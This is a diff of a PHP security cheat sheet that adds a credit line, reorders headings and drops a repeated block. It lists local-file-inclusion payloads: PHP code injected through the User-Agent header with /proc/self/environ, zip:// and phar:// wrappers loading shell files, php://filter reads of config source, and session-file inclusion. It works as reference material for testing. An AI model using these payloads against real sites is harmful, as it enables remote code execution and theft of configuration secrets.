@@ -1,3 +1,5 @@
+#Thanks to: https://github.com/qazbnm456/awesome-security-trivia/
+
 The developer may want to ensure that users cannot give any query key containing underscore, because variable names with underscore often refer to private or sensitive variables.
 Dots and spaces in variable names are converted to underscores. For example <input name="a.b" /> becomes $_REQUEST["a_b"].
 
@@ -13,6 +15,8 @@ Remote code exection:
 GET /index.php?file=/proc/self/environ&cmd=id HTTP/1.1
 Host: www.site.com
 User-Agent: <?php echo assert($_GET['cmd']);?>
+
+Remote code execution:
 Zip and Phar wrappers
 
 index.php?file=zip://image.zip#shell.php
@@ -28,14 +32,3 @@ Indirect Local File Inclusion
 Reading arbitrary files:
 
 index.php?file=php://filter/convert.base64-encode/resource=config # will append ".php" at the end
-
-Remote code execution:
-
-Zip and Phar wrappers
-index.php?file=zip://image.zip#shell
-index.php?file=phar://image.phar/shell
-
-Session Files
-PHP5 stores session files in /var/lib/php5/sess_*
-Cookie: PHPSESSID=123php # /var/lib/php5/sess_123php
-index.php?file=/var/lib/php5/sess_123
